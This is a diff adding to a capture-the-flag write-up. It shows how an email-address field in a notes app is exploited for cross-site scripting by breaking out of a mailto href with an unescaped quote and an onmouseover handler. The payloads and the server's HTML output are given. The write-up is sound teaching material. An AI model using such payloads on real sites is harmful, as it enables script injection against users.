@@ -111,7 +111,21 @@ However invalid email addresses and URL were not getting transformed e.g. invali
 ```
 
 Tried a lot with url to escape the anchor tag and alert the flag, but didn't work. 
-Doing a simple google search with the text xss email payload , first result is https://brutelogic.com.br/blog/xss-limited-input-formats/  
+Doing a simple google search with the text xss email payload , first result is https://brutelogic.com.br/blog/xss-limited-input-formats/  which suggest a xss payload to use is `"<svg/onload=alert(1)>"@x.y` , bruteforce tweets this as well
+![image](https://user-images.githubusercontent.com/19681324/113426701-79839500-93f1-11eb-8a37-c33d39ec712b.png)
+
+but <> characters are escaped by the server side
+```
+<a href="mailto:"&lt;svg/onload=alert(1)&gt;"@x.y">"&lt;svg/onload=alert(1)&gt;"@x.y</a>
+```
+however " are not escaped, as we can see avobe we came out of href attribute. So changing the payload slightly to `"onmouseover=alert('flag{THIS_IS_THE_FLAG}');"@x.y` we get a response like this
+```
+<p id="notes-display" class="card-content" contenteditable="true">
+<a href="mailto:"onmouseover=alert('flag{THIS_IS_THE_FLAG}');"@x.y">"onmouseover=alert('flag{THIS_IS_THE_FLAG}');"@x.y</a>
+```
+which gets us an alert 
+![image](https://user-images.githubusercontent.com/19681324/113427645-0a0ea500-93f3-11eb-93b3-9571e871e645.png)
+
 
 
 
